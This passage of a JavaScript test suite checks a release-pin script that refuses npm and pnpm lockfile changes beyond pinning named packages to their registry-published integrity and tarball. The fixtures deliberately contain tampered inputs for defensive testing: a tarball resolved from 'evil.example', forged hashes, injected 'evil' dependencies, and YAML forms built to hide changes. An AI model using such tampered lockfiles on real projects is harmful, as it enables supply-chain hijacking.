  assert.equal(npmLockRefusal('package-lock.json', before, good, pins, registry), null);
  assert.match(npmLockRefusal('package-lock.json', before, good, pins, new Map()), /registry entry could not be read/, 'no registry entry, no pin');
  assert.match(npmLockRefusal('package-lock.json', before, npmLock('1.4.0-rl.7.3', ghTarball('@revt-eng/sdk', '1.4.0-rl.7.3', 'def456'), 'sha512-forged'), pins, registry), /integrity .* differs from the registry's/);
  assert.match(npmLockRefusal('package-lock.json', before, npmLock('1.4.0-rl.7.3', 'https://evil.example/sdk.tgz', 'sha512-new'), pins, registry), /not the registry's/);
  assert.match(npmLockRefusal('package-lock.json', before, npmLock('1.4.0-rl.7.3', 'https://evil.example/sdk.tgz', 'sha512-new'), pins, registry), /not the registry's/);
  assert.match(npmLockRefusal('package-lock.json', before, npmLock('1.4.0-rl.7.2', ghTarball('@revt-eng/sdk', '1.4.0-rl.7.2'), 'sha512-x'), pins, registry), /not the pinned 1\.4\.0-rl\.7\.3/);
  assert.match(npmLockRefusal('package-lock.json', before, npmLock('1.4.0-rl.7.3', ghTarball('@revt-eng/sdk', '1.4.0-rl.7.3'), 'sha512-new', { hasInstallScript: true }), pins, registry), /more than its version, resolved and integrity/);
  const other = JSON.parse(good); other.packages['node_modules/zod'].version = '4.0.1';
  assert.match(npmLockRefusal('package-lock.json', before, JSON.stringify(other), pins, registry), /more than the pinned packages' ranges/);
  const added = JSON.parse(good); added.packages['node_modules/evil'] = { version: '1.0.0' };
  assert.match(npmLockRefusal('package-lock.json', before, JSON.stringify(added), pins, registry), /adds or removes entries/);
  assert.match(npmLockRefusal('package-lock.json', before, JSON.stringify({ ...JSON.parse(good), lockfileVersion: 2 }), pins, registry), /lockfileVersion 3/);
});

const pnpmLock = (version, integrity, { extraImporterLine = '', otherSnapshot = 'pure-rand: 8.4.2' } = {}) => [
  "lockfileVersion: '9.0'", '', 'settings:', '  autoInstallPeers: true', '', 'importers:', '', '  .:', '    dependencies:',
  "      '@revt-eng/sdk':", `        specifier: ${version}`, `        version: ${version}(react@19.2.7)`, ...(extraImporterLine ? [extraImporterLine] : []),
  '      react:', '        specifier: 19.2.7', '        version: 19.2.7', '', 'packages:', '',
  `  '@revt-eng/sdk@${version}':`, `    resolution: {integrity: ${integrity}, tarball: ${ghTarball('@revt-eng/sdk', version)}}`, '    peerDependencies:', "      react: '>=19'", '',
  '  pure-rand@8.4.2:', '    resolution: {integrity: sha512-rand}', '',
  '  react@19.2.7:', '    resolution: {integrity: sha512-react}', '', 'snapshots:', '',
  `  '@revt-eng/sdk@${version}(react@19.2.7)':`, '    dependencies:', `      ${otherSnapshot}`, '      react: 19.2.7', '', '  pure-rand@8.4.2: {}', '', '  react@19.2.7: {}', '',
].join('\n');

test('a pnpm-lock.yaml may re-pin only the pinned importers, packages and snapshots', () => {
  const pins = [{ name: '@revt-eng/sdk', version: '1.4.0' }];
  const before = pnpmLock('1.3.0', 'sha512-old');
  const registry = new Map([['@revt-eng/sdk', { '1.4.0': { integrity: 'sha512-new', tarball: ghTarball('@revt-eng/sdk', '1.4.0'), dependencies: { 'pure-rand': '^8.0.0' }, peerDependencies: { react: '>=19' } } }]]);
  assert.equal(pnpmLockRefusal('pnpm-lock.yaml', before, pnpmLock('1.4.0', 'sha512-new'), pins, registry), null);
  assert.match(pnpmLockRefusal('pnpm-lock.yaml', before, pnpmLock('1.4.0', 'sha512-new'), pins, new Map()), /registry entry could not be read/, 'no registry entry, no pin');
  assert.match(pnpmLockRefusal('pnpm-lock.yaml', before, pnpmLock('1.4.0', 'sha512-forged'), pins, registry), /differs from the registry's/);
  assert.match(pnpmLockRefusal('pnpm-lock.yaml', before, pnpmLock('1.4.1', 'sha512-new'), pins, registry), /not the pinned 1\.4\.0|not a pinned package at its pin/);
  assert.match(pnpmLockRefusal('pnpm-lock.yaml', before, pnpmLock('1.4.0', 'sha512-new').replace('autoInstallPeers: true', 'autoInstallPeers: false'), pins, registry), /changes its settings/);
  assert.match(pnpmLockRefusal('pnpm-lock.yaml', before, pnpmLock('1.4.0', 'sha512-new').replace("        specifier: 19.2.7\n        version: 19.2.7", "        specifier: 19.2.8\n        version: 19.2.8"), pins, registry), /changes react, which is not being pinned/);
  assert.match(pnpmLockRefusal('pnpm-lock.yaml', before, pnpmLock('1.4.0', 'sha512-new').replace('  react@19.2.7:\n    resolution: {integrity: sha512-react}', '  react@19.2.7:\n    resolution: {integrity: sha512-evil}'), pins, registry), /packages react@19\.2\.7 changes/);
  assert.match(pnpmLockRefusal('pnpm-lock.yaml', before, pnpmLock('1.4.0', 'sha512-new').replace('  react@19.2.7: {}', '  react@19.2.7: {}\n\n  evil@1.0.0: {}'), pins, registry), /adds evil@1\.0\.0/);
  assert.match(pnpmLockRefusal('pnpm-lock.yaml', before, pnpmLock('1.4.0', 'sha512-new', { extraImporterLine: '        evil: yes' }), pins, registry), /more than a specifier and a version/);
});

test('the registry entries are read per package, and an unreadable one stops the attempt', async () => {
  const calls = [];
  const fetchImpl = async (url, init) => {
    calls.push([url, init.headers.Authorization]);
    if (url.includes('npmjs')) return { ok: false, status: 404 };
    return { ok: true, json: async () => ({ versions: { '1.4.0': { dist: { integrity: 'sha512-new', tarball: 't' } } } }) };
  };
  const registry = await readRegistry([{ name: '@revt-eng/sdk', version: '1.4.0' }], { token: 'tok', fetchImpl });
  assert.deepEqual(registry.get('@revt-eng/sdk'), { '1.4.0': { integrity: 'sha512-new', tarball: 't' } });
  // Fails closed: an unreadable entry stops the attempt (the commit command exits 75 and the next attempt retries).
  await assert.rejects(readRegistry([{ name: '@revt-eng/sdk', version: '1.4.0' }, { name: '@revturbine/cli', version: '0.21.20' }], { token: 'tok', fetchImpl }),
    (error) => error instanceof RegistryUnavailable && /could not read @revturbine\/cli/.test(error.message));
  assert.deepEqual(calls.slice(0, 2), [['https://npm.pkg.github.com/@revt-eng%2fsdk', 'Bearer tok'], ['https://npm.pkg.github.com/@revt-eng%2fsdk', 'Bearer tok']]);
  assert.equal(calls[2][0], 'https://registry.npmjs.org/@revturbine%2fcli');
  assert.match(resolutionRefusal('x', '@revturbine/cli', '0.21.20', 'sha512-abc', 'https://registry.npmjs.org/@revturbine/cli/-/cli-0.21.20.tgz', new Map()), /could not be read/);
});

// GitHub Packages' metadata omits peerDependenciesMeta, so pnpm writes a @revt-eng entry without its optional peers when
// it resolves the version from the registry and with them when it reads the manifest of an entry the lockfile already
// has. A pin that moves one package therefore rewrites which peers of the others are optional (web RL-1, 2026-11-17:
// "packages @revt-eng/core@0.1.562-rl.1.5 changes" when only the SDK moved from rl.1.4 to rl.1.5).
import { gzipSync } from 'node:zlib';
import { createHash } from 'node:crypto';
import { lockGraph, peerMetaToVerify, pnpmFormRefusal, readManifests, tarballManifest } from '../scripts/release-pin.mjs';

const peerLock = ({ sdk = '1.3.0', integrity = 'sha512-old', optionalPeer = false, coreIntegrity = 'sha512-core', drizzleOptional = optionalPeer } = {}) => [
  "lockfileVersion: '9.0'", '', 'settings:', '  autoInstallPeers: true', '', 'importers:', '', '  .:', '    dependencies:',
  "      '@revt-eng/core':", '        specifier: 1.0.0-rl.7.2', '        version: 1.0.0-rl.7.2(drizzle-orm@0.45.2)',
  "      '@revt-eng/sdk':", `        specifier: ${sdk}`, `        version: ${sdk}(react@19.2.7)`,
  '      react:', '        specifier: 19.2.7', '        version: 19.2.7', '', 'packages:', '',
  "  '@revt-eng/core@1.0.0-rl.7.2':", `    resolution: {integrity: ${coreIntegrity}, tarball: ${ghTarball('@revt-eng/core', '1.0.0-rl.7.2')}}`,
  '    peerDependencies:', "      drizzle-orm: '>=0.30.0'", ...(optionalPeer ? ['    peerDependenciesMeta:', '      drizzle-orm:', '        optional: true'] : []), '',
  `  '@revt-eng/sdk@${sdk}':`, `    resolution: {integrity: ${integrity}, tarball: ${ghTarball('@revt-eng/sdk', sdk)}}`, '    peerDependencies:', "      react: '>=19'", '',
  '  drizzle-orm@0.45.2:', '    resolution: {integrity: sha512-drizzle}', '',
  '  react@19.2.7:', '    resolution: {integrity: sha512-react}', '',
  '  zod@4.0.0:', '    resolution: {integrity: sha512-zod}', '', 'snapshots:', '',
  "  '@revt-eng/core@1.0.0-rl.7.2(drizzle-orm@0.45.2)':", '    dependencies:',
  ...(optionalPeer ? ['      zod: 4.0.0', '    optionalDependencies:', '      drizzle-orm: 0.45.2'] : ['      drizzle-orm: 0.45.2', '      zod: 4.0.0']), '',
  `  '@revt-eng/sdk@${sdk}(react@19.2.7)':`, '    dependencies:', '      react: 19.2.7', '',
  ...(drizzleOptional ? ['  drizzle-orm@0.45.2:', '    optional: true'] : ['  drizzle-orm@0.45.2: {}']), '',
  '  react@19.2.7: {}', '', '  zod@4.0.0: {}', '',
].join('\n');
const peerPins = [{ name: '@revt-eng/core', version: '1.0.0-rl.7.2' }, { name: '@revt-eng/sdk', version: '1.4.0' }];
const peerRegistry = new Map([
  ['@revt-eng/core', { '1.0.0-rl.7.2': { integrity: 'sha512-core', tarball: ghTarball('@revt-eng/core', '1.0.0-rl.7.2'), dependencies: { zod: '^4.0.0' }, peerDependencies: { 'drizzle-orm': '>=0.30.0' } } }],
  ['@revt-eng/sdk', { '1.4.0': { integrity: 'sha512-new', tarball: ghTarball('@revt-eng/sdk', '1.4.0'), dependencies: { zod: '^4.0.0' }, optionalDependencies: { fsevents: '*' }, peerDependencies: { react: '>=19' } } }],
]);
/** What the push job read from core's tarball: its package.json marks drizzle-orm optional. */
const coreManifest = (meta = { 'drizzle-orm': { optional: true } }, integrity = 'sha512-core') => new Map([['@revt-eng/core@1.0.0-rl.7.2', { integrity, manifest: { name: '@revt-eng/core', peerDependenciesMeta: meta } }]]);
const peerBefore = peerLock();
const peerAfter = (options) => peerLock({ sdk: '1.4.0', integrity: 'sha512-new', optionalPeer: true, ...options });
const peerRefusal = (from, to, { pins = peerPins, manifests = coreManifest() } = {}) => pnpmLockRefusal('pnpm-lock.yaml', from, to, pins, peerRegistry, manifests);

test('a pnpm pin may change which peers of a @revt-eng entry are optional, and nothing that does not follow from it', () => {
  // The failing pin: the SDK moves; core, pinned at the version it already has, gains its optional peer, its snapshot
  // moves that peer to optionalDependencies, and drizzle-orm, now reached only through it, becomes optional.
  assert.equal(peerRefusal(peerBefore, peerAfter()), null);
  // The other direction (the registry's form again, which needs no tarball), and the same when the package is not one of the pins.
  assert.equal(peerRefusal(peerAfter({ sdk: '1.3.0', integrity: 'sha512-old' }), peerLock({ sdk: '1.4.0', integrity: 'sha512-new' }), { manifests: new Map() }), null);
  assert.equal(peerRefusal(peerBefore, peerAfter(), { pins: [peerPins[1]] }), null);
  // Still refused: the entry's resolution or peers changing with it.
  assert.match(peerRefusal(peerBefore, peerAfter({ coreIntegrity: 'sha512-forged' })), /packages @revt-eng\/core@1\.0\.0-rl\.7\.2 changes more than which of its peers are optional/);
  assert.match(peerRefusal(peerBefore, peerAfter().replace("      drizzle-orm: '>=0.30.0'\n    peerDependenciesMeta", "      drizzle-orm: '*'\n    peerDependenciesMeta")), /changes more than which of its peers are optional/);
  assert.match(peerRefusal(peerBefore, peerAfter().replace('        optional: true\n', '        optional: true\n    hasBin: true\n')), /changes more than which of its peers are optional/);
  assert.match(peerRefusal(peerBefore, peerAfter().replace('      drizzle-orm:\n        optional: true', '      evil:\n        optional: true')), /marks evil optional, which is not one of its peers/);
  assert.match(peerRefusal(peerBefore, peerAfter().replace('      drizzle-orm:\n        optional: true', '      drizzle-orm:\n        optional: true\n        evil: true')), /more than optional flags/);
  // Still refused: the same change on a package from another registry.
  assert.match(peerRefusal(peerBefore, peerAfter().replace('    resolution: {integrity: sha512-react}', '    resolution: {integrity: sha512-react}\n    peerDependenciesMeta:\n      x:\n        optional: true')), /packages react@19\.2\.7 changes/);
  // Still refused: a snapshot whose edges change, or move without the peer's flag changing.
  assert.match(peerRefusal(peerBefore, peerAfter().replace('    optionalDependencies:\n      drizzle-orm: 0.45.2', '    optionalDependencies:\n      drizzle-orm: 0.45.3')), /snapshots @revt-eng\/core@1\.0\.0-rl\.7\.2\(drizzle-orm@0\.45\.2\) changes/);
  assert.match(peerRefusal(peerBefore, peerAfter().replace('    dependencies:\n      zod: 4.0.0\n    optionalDependencies:\n      drizzle-orm: 0.45.2', '    optionalDependencies:\n      drizzle-orm: 0.45.2\n      zod: 4.0.0')), /moves zod between dependencies and optionalDependencies/);
  assert.match(peerRefusal(peerBefore, peerAfter().replace('      zod: 4.0.0\n    optionalDependencies:', '      zod: 4.0.0\n      evil: 1.0.0\n    optionalDependencies:')), /snapshots @revt-eng\/core@1\.0\.0-rl\.7\.2\(drizzle-orm@0\.45\.2\) changes/);
  assert.match(peerRefusal(peerBefore, peerLock({ sdk: '1.4.0', integrity: 'sha512-new' }).replace('      drizzle-orm: 0.45.2\n      zod: 4.0.0', '      zod: 4.0.0\n    optionalDependencies:\n      drizzle-orm: 0.45.2')), /moves drizzle-orm between dependencies and optionalDependencies/);
  // Still refused: `optional: true` where the lockfile's own graph does not put it, and any other change to a snapshot.
  assert.match(peerRefusal(peerBefore, peerAfter().replace('  react@19.2.7: {}', '  react@19.2.7:\n    optional: true')), /snapshots react@19\.2\.7 changes whether it is optional/);
  assert.match(peerRefusal(peerBefore, peerLock({ sdk: '1.4.0', integrity: 'sha512-new', drizzleOptional: true })), /snapshots drizzle-orm@0\.45\.2 changes whether it is optional/);
  assert.match(peerRefusal(peerBefore, peerAfter().replace('  zod@4.0.0: {}', '  zod@4.0.0:\n    dependencies:\n      react: 19.2.7')), /snapshots zod@4\.0\.0 changes/);
  assert.match(peerRefusal(peerBefore, peerAfter().replace('  drizzle-orm@0.45.2:\n    optional: true', '  drizzle-orm@0.45.2:\n    optional: true\n    transitivePeerDependencies:\n      - evil')), /snapshots drizzle-orm@0\.45\.2 changes/);
});

test('optional peers are what the package itself says, read from its tarball, or none', () => {
  // No package.json read for the entry, one read from a tarball with another hash, or one that says something else: refused.
  assert.match(peerRefusal(peerBefore, peerAfter(), { manifests: new Map() }), /packages @revt-eng\/core@1\.0\.0-rl\.7\.2 marks peers optional, which could not be checked/);
  assert.match(peerRefusal(peerBefore, peerAfter(), { manifests: coreManifest(undefined, 'sha512-other') }), /could not be checked/);
  assert.match(peerRefusal(peerBefore, peerAfter(), { manifests: coreManifest({}) }), /marks other peers optional than the package's own package\.json does/);
  assert.match(peerRefusal(peerBefore, peerAfter(), { manifests: coreManifest(null) }), /marks other peers optional/);
  assert.match(peerRefusal(peerBefore, peerAfter(), { manifests: coreManifest({ 'drizzle-orm': { optional: false } }) }), /marks other peers optional/);
  assert.match(peerRefusal(peerBefore, peerAfter(), { manifests: coreManifest({ 'drizzle-orm': { optional: true }, react: { optional: true } }) }), /marks other peers optional/);
  // The flags a pin's new entry carries are checked the same way.
  const flagged = peerAfter().replace("    peerDependencies:\n      react: '>=19'", "    peerDependencies:\n      react: '>=19'\n    peerDependenciesMeta:\n      react:\n        optional: true");
  assert.match(peerRefusal(peerBefore, flagged), /packages @revt-eng\/sdk@1\.4\.0 marks peers optional, which could not be checked/);

  // Which entries the push job downloads: the ones whose flags are new, from GitHub Packages only, by sha512.
  const real = (text) => text.replaceAll('sha512-core', 'sha512-Y29yZQ==');
  assert.deepEqual(peerMetaToVerify(real(peerBefore), real(peerAfter())), [{ key: '@revt-eng/core@1.0.0-rl.7.2', integrity: 'sha512-Y29yZQ==', tarball: ghTarball('@revt-eng/core', '1.0.0-rl.7.2') }]);
  assert.deepEqual(peerMetaToVerify(real(peerAfter()), real(peerAfter())), [], 'unchanged flags are the branch head\'s');
  assert.deepEqual(peerMetaToVerify(real(peerBefore), real(peerAfter()).replace('https://npm.pkg.github.com/download/@revt-eng/core/', 'https://evil.example/download/@revt-eng/core/')), [], 'never another host');
  assert.deepEqual(peerMetaToVerify(real(peerBefore), real(peerAfter()).replace('download/@revt-eng/core/1.0.0-rl.7.2/', 'download/@revt-eng/sdk/1.0.0-rl.7.2/')), [], 'never another package');
  assert.deepEqual(peerMetaToVerify(peerBefore.replaceAll('sha512-core', 'sha1-Y29yZQ=='), peerAfter().replaceAll('sha512-core', 'sha1-Y29yZQ==')), [], 'only a sha512 integrity');
  assert.deepEqual(peerMetaToVerify(real(peerBefore), real(peerAfter()).replace('  react@19.2.7: {}', '  react@19.2.7: {optional: true}')), [], 'nothing is read from a lockfile that is not in pnpm\'s form');
});

/** A gzipped tar with these files, as npm packs one. */
function tarball(files) {
  const blocks = [];
  for (const [name, content, type = '0'] of files) {
    const header = Buffer.alloc(512), body = Buffer.from(content);
    header.write(name, 0);
    header.write('0000644\0', 100); header.write('0000000\0', 108); header.write('0000000\0', 116);
    header.write(`${body.length.toString(8).padStart(11, '0')}\0`, 124);
    header.write('00000000000\0', 136); header.write('        ', 148); header.write(type, 156); header.write('ustar\0' + '00', 257);
    header.write(`${[...header].reduce((sum, byte) => sum + byte, 0).toString(8).padStart(6, '0')}\0 `, 148);
    blocks.push(header, body, Buffer.alloc((512 - (body.length % 512)) % 512));
  }
  return gzipSync(Buffer.concat([...blocks, Buffer.alloc(1024)]));
}

test('the package.json of a tarball is read only from the tarball the lockfile names, with its hash', async () => {
  const manifest = { name: '@revt-eng/core', version: '1.0.0-rl.7.2', peerDependenciesMeta: { 'drizzle-orm': { optional: true } } };
  const tgz = tarball([['package/README.md', 'x'.repeat(700)], ['package/package.json', JSON.stringify(manifest)], ['package/nested/package.json', '{"name":"other"}']]);
  assert.deepEqual(tarballManifest(tgz), manifest);
  assert.throws(() => tarballManifest(tarball([['package/index.js', '']])), /no package\/package\.json/);
  const integrity = `sha512-${createHash('sha512').update(tgz).digest('base64')}`;
  const entry = { key: '@revt-eng/core@1.0.0-rl.7.2', integrity, tarball: ghTarball('@revt-eng/core', '1.0.0-rl.7.2') };
  const calls = [];
  /** A stand-in for fetch. */
  const fetching = (impl) => impl;
  const fetchImpl = fetching(async (url, init) => { calls.push([url, init.headers.Authorization]); return { ok: true, arrayBuffer: async () => tgz.buffer.slice(tgz.byteOffset, tgz.byteOffset + tgz.length) }; });
  const manifests = await readManifests([entry], { token: 'tok', fetchImpl });
  assert.deepEqual(manifests.get(entry.key), { integrity, manifest });
  assert.deepEqual(calls, [[entry.tarball, 'Bearer tok']]);
  // End to end: the lockfile check takes exactly that.
  const real = (text) => text.replaceAll('sha512-core', integrity);
  const registry = new Map([...peerRegistry, ['@revt-eng/core', { '1.0.0-rl.7.2': { ...peerRegistry.get('@revt-eng/core')?.['1.0.0-rl.7.2'], integrity } }]]);
  assert.equal(pnpmLockRefusal('pnpm-lock.yaml', real(peerBefore), real(peerAfter()), peerPins, registry, manifests), null);
  // Another hash is an error; a tarball that cannot be downloaded stops the attempt (exit 75), as an unreadable registry entry does.
  await assert.rejects(readManifests([{ ...entry, integrity: 'sha512-other' }], { fetchImpl }), /does not have the integrity the lockfile records/);
  await assert.rejects(readManifests([entry], { fetchImpl: fetching(async () => ({ ok: false, status: 503 })) }), (error) => error instanceof RegistryUnavailable && /could not read the tarball of @revt-eng\/core@1\.0\.0-rl\.7\.2/.test(error.message));
  await assert.rejects(readManifests([entry], { fetchImpl: fetching(async () => { throw new Error('socket'); }) }), (error) => error instanceof RegistryUnavailable);
});

test('a snapshot or package a pin adds is that version as the registry publishes it', () => {
  const sdkSnapshot = "  '@revt-eng/sdk@1.4.0(react@19.2.7)':\n    dependencies:\n      react: 19.2.7";
  const withSnapshot = (body) => peerAfter().replace(sdkSnapshot, body);
  // Accepted: the registry's dependency, at a snapshot the lockfile has.
  assert.equal(peerRefusal(peerBefore, withSnapshot(`${sdkSnapshot}\n      zod: 4.0.0`)), null);
  // A dependency the registry does not list for the version, under either heading.
  assert.match(peerRefusal(peerBefore, withSnapshot(`${sdkSnapshot}\n      drizzle-orm: 0.45.2`)), /snapshots @revt-eng\/sdk@1\.4\.0\(react@19\.2\.7\) depends on drizzle-orm, which the registry does not list/);
  assert.match(peerRefusal(peerBefore, withSnapshot(`${sdkSnapshot}\n    optionalDependencies:\n      zod: 4.0.0`)), /optionally depends on zod, which the registry does not list as an optional dependency or optional peer/);
  assert.match(peerRefusal(peerBefore, withSnapshot("  '@revt-eng/sdk@1.4.0(react@19.2.7)':\n    optionalDependencies:\n      react: 19.2.7")), /optionally depends on react/);
  assert.match(peerRefusal(peerBefore, withSnapshot(`${sdkSnapshot}\n    optionalDependencies:\n      react: 19.2.7`)), /lists react under dependencies and optionalDependencies/);
  // An edge to a snapshot the lockfile does not have, a field pnpm does not write, an `optional: true` the graph does not give.
  assert.match(peerRefusal(peerBefore, withSnapshot(`${sdkSnapshot}\n      zod: 4.0.1`)), /zod@4\.0\.1 is depended on, and the lockfile has no snapshot of it/);
  assert.match(peerRefusal(peerBefore, withSnapshot(`${sdkSnapshot}\n    patched: true`)), /has patched, which pnpm does not write on a snapshot/);
  assert.match(peerRefusal(peerBefore, withSnapshot(`${sdkSnapshot}\n    optional: true`)), /snapshots @revt-eng\/sdk@1\.4\.0\(react@19\.2\.7\) is optional, which the lockfile's dependencies do not explain/);
  // The reviewer's probes: a second snapshot of the pinned package that nothing depends on, with or without new edges.
  assert.match(peerRefusal(peerBefore, withSnapshot(`${sdkSnapshot}\n      drizzle-orm: 0.45.2\n\n  '@revt-eng/sdk@1.4.0(evil)':\n    dependencies:\n      drizzle-orm: 0.45.2`)), /depends on drizzle-orm, which the registry does not list/);
  assert.match(peerRefusal(peerBefore, withSnapshot(`${sdkSnapshot}\n\n  '@revt-eng/sdk@1.4.0(react@18)':\n    dependencies:\n      react: 19.2.7\n      zod: 4.0.0`)), /snapshots @revt-eng\/sdk@1\.4\.0\(react@18\) has a peer suffix that does not match its peer react/);
  assert.match(peerRefusal(peerBefore, withSnapshot(`${sdkSnapshot}\n\n  '@revt-eng/sdk@1.4.0':\n    dependencies:\n      zod: 4.0.0`)), /snapshots adds @revt-eng\/sdk@1\.4\.0, which nothing depends on/);
  // The importer must point at a snapshot too.
  assert.match(peerRefusal(peerBefore, peerAfter().replace('version: 1.4.0(react@19.2.7)', 'version: 1.4.0(react@18.0.0)')), /@revt-eng\/sdk@1\.4\.0\(react@18\.0\.0\) is depended on, and the lockfile has no snapshot of it/);
  // The new packages entry: the registry's peers, only fields pnpm writes.
  assert.match(peerRefusal(peerBefore, peerAfter().replace("    peerDependencies:\n      react: '>=19'", "    peerDependencies:\n      react: '>=19'\n      evil: '*'")), /packages @revt-eng\/sdk@1\.4\.0 does not have the registry's peers \(evil\)/);
  assert.match(peerRefusal(peerBefore, peerAfter().replace("\n    peerDependencies:\n      react: '>=19'", '')), /does not have the registry's peers \(react\)/);
  assert.match(peerRefusal(peerBefore, peerAfter().replace("    peerDependencies:\n      react: '>=19'", "    peerDependencies:\n      react: '>=19'\n    requiresBuild: true")), /has requiresBuild, which pnpm does not write on a package/);
  // A lockfile's graph, as lockGraph reads it.
  assert.equal(pnpmFormRefusal('pnpm-lock.yaml', peerAfter()), null);
  assert.equal(typeof lockGraph, 'function');
});

test('a pnpm-lock.yaml is read only in the form pnpm writes', () => {
  const refusedForm = (text, message) => {
    assert.match(String(pnpmFormRefusal('pnpm-lock.yaml', text)), /is not in the form pnpm writes/, message);
    // In the bundle and on the branch alike, before anything else is looked at.
    assert.match(String(peerRefusal(peerBefore, text)), /^pnpm-lock\.yaml line \d+ is not in the form pnpm writes|^pnpm-lock\.yaml is not in the form/, message);
    assert.match(String(peerRefusal(text, peerAfter())), /^pnpm-lock\.yaml on the branch (line \d+ )?is not in the form pnpm writes/, message);
  };
  const after = peerAfter();
  const swap = (from, to, text = after) => { assert.ok(text.includes(from), from); return text.replace(from, to); };
  // Every form pnpm writes, including the inline ones.
  assert.equal(pnpmFormRefusal('pnpm-lock.yaml', after), null);
  assert.equal(pnpmFormRefusal('pnpm-lock.yaml', swap('  zod@4.0.0:\n    resolution: {integrity: sha512-zod}', [
    '  zod@4.0.0:', '    resolution: {integrity: sha512-zod}', "    engines: {node: ^18.0.0 || >=20.0.0, npm: '>=9'}", '    cpu: [x64, arm64]', '    os: [darwin]', '    libc: [glibc]', '    hasBin: true',
    "    deprecated: 'Renamed: use zod-next'", '    bundledDependencies:', '      - tslib', "      - '@scope/dep'", '',
    '  ansi@0.0.8:', "    resolution: {integrity: sha512-ansi}", "    engines: {'0': node >= 0.8.0}", '    deprecated: "a\\tb"'].join('\n'))), null);

  // The reviewer's probes: a flow mapping pnpm's parser reads in full and a line reader would read as empty.
  refusedForm(swap('  react@19.2.7: {}', '  react@19.2.7: {optional: true}'), 'p4/p6: a required dependency marked optional in flow form');
  refusedForm(swap('  drizzle-orm@0.45.2:\n    optional: true', '  drizzle-orm@0.45.2: {optional: true, dependencies: {evil-pkg: 9.9.9}}'), 'p3: optional and a dependency injected in flow form');
  refusedForm(swap("  '@revt-eng/core@1.0.0-rl.7.2':\n    resolution: {integrity: sha512-core, tarball: https://npm.pkg.github.com/download/@revt-eng/core/1.0.0-rl.7.2/abc123}\n    peerDependencies:\n      drizzle-orm: '>=0.30.0'",
    "  '@revt-eng/core@1.0.0-rl.7.2': {resolution: {integrity: sha512-FORGED}, peerDependencies: {evil: '*'}}"), 'p3: a packages entry in flow form');
  refusedForm(swap('    optionalDependencies:\n      drizzle-orm: 0.45.2', '    optionalDependencies: {drizzle-orm: 0.45.2}'), 'p4: optionalDependencies in flow form');
  refusedForm(swap('    peerDependenciesMeta:\n      drizzle-orm:\n        optional: true', '    peerDependenciesMeta: {evil: {optional: true}}'), 'p5: peerDependenciesMeta in flow form');
  refusedForm(swap('  drizzle-orm@0.45.2:\n    optional: true', '  drizzle-orm@0.45.2:\n\toptional: true'), 'p4: a tab');
  refusedForm(swap('  react@19.2.7:\n    resolution: {integrity: sha512-react}', '  react@19.2.7:\n    resolution: {integrity: sha512-react}\n\n  react@19.2.7:\n    resolution: {integrity: sha512-FORGED}'), 'p1: an entry twice');
  refusedForm(swap("  '@revt-eng/core@1.0.0-rl.7.2':", '  "@revt-eng/core@1.0.0-rl.7.2":'), 'p2: a double-quoted key');

  // A `{}` entry given a body on the next line, which a diff of entries would not see.
  refusedForm(swap('  zod@4.0.0: {}', '  zod@4.0.0: {}\n    optional: true'), 'a body under {}');
  refusedForm(swap('  zod@4.0.0: {}', '  zod@4.0.0: {}\n      dependencies: {evil: 1.0.0}'), 'a flow body under {}');
  refusedForm(swap('  zod@4.0.0: {}', '  zod@4.0.0: {dependencies: {evil: 1.0.0}}'), 'a flow body in place of {}');
  refusedForm(swap('    dependencies:\n      react: 19.2.7\n\n  drizzle', '    dependencies: {react: 19.2.7, evil: 1.0.0}\n\n  drizzle'), 'flow dependencies');
  refusedForm(swap('    resolution: {integrity: sha512-new, tarball', "    resolution: {x: 'integrity: sha512-new', integrity: sha512-evil, tarball"), 'a quoted value in a resolution');
  refusedForm(swap('    resolution: {integrity: sha512-zod}', '    resolution: {integrity: sha512-zod, integrity: sha512-evil}'), 'a key twice in a resolution');
  refusedForm(swap('    resolution: {integrity: sha512-zod}', '    resolution: {integrity: sha512-zod}\n    cpu: {x64: true}'), 'a mapping where pnpm writes a list');
  refusedForm(swap('  autoInstallPeers: true', '  autoInstallPeers: true\n  list: [a, b]'), 'a one-line list anywhere else');
  refusedForm(swap('  autoInstallPeers: true', '  autoInstallPeers: {}'), 'an empty mapping anywhere else');
  // Duplicate keys at every level, and quoting that would make two spellings of one key.
  refusedForm(swap('    dependencies:\n      react: 19.2.7\n\n  drizzle', '    dependencies:\n      react: 19.2.7\n      react: 19.2.8\n\n  drizzle'), 'a dependency twice');
  refusedForm(swap('  drizzle-orm@0.45.2:\n    optional: true', '  drizzle-orm@0.45.2:\n    optional: true\n    optional: true'), 'a field twice');
  refusedForm(swap('snapshots:', 'snapshots:\n\n  zod@9.9.9: {}\n\nsnapshots:'), 'a section twice');
  refusedForm(swap('  react@19.2.7: {}', "  'react@19.2.7': {}"), 'a quoted key pnpm writes plain');
  refusedForm(swap("  '@revt-eng/sdk@1.4.0':", '  @revt-eng/sdk@1.4.0:'), 'a plain key pnpm writes quoted');
  refusedForm(swap('  react@19.2.7: {}', '  "react@19.2.7": {}'), 'a double-quoted key');
  refusedForm(swap('  react@19.2.7: {}', '  ? react@19.2.7\n  : {}'), 'a complex key');
  refusedForm(swap('  react@19.2.7: {}', '  react@19.2.7 : {}'), 'a space before the colon');
  refusedForm(swap('  react@19.2.7: {}', '  react@19.2.7:{}'), 'no space after the colon');
  // Anchors, aliases, tags, merge keys, comments, block scalars, directives, documents.
  refusedForm(swap('      react: 19.2.7\n\n  drizzle', '      react: &a 19.2.7\n\n  drizzle'), 'an anchor');
  refusedForm(swap('      react: 19.2.7\n\n  drizzle', '      react: *a\n\n  drizzle'), 'an alias');
  refusedForm(swap('      react: 19.2.7\n\n  drizzle', '      react: !!str 19.2.7\n\n  drizzle'), 'a tag');
  refusedForm(swap('      react: 19.2.7\n\n  drizzle', '      <<: *a\n\n  drizzle'), 'a merge key');
  refusedForm(swap('  autoInstallPeers: true', '  autoInstallPeers: true # yes'), 'a trailing comment');
  refusedForm(swap('settings:', '# a comment\nsettings:'), 'a comment line');
  refusedForm(swap('    resolution: {integrity: sha512-zod}', '    resolution: {integrity: sha512-zod}\n    deprecated: |\n      gone'), 'a block scalar');
  refusedForm(swap('    resolution: {integrity: sha512-zod}', '    resolution: {integrity: sha512-zod}\n    deprecated: gone\n      and more'), 'a value continued on the next line');
  refusedForm(swap('    resolution: {integrity: sha512-zod}', "    resolution: {integrity: sha512-zod}\n    deprecated: 'gone\n      and more'"), 'a quoted value continued on the next line');
  refusedForm(swap('    resolution: {integrity: sha512-zod}', '    resolution: {integrity: sha512-zod}\n    hasBin: "true"'), 'a double-quoted value where pnpm writes none');
  refusedForm(`%YAML 1.2\n---\n${after}`, 'a directive');
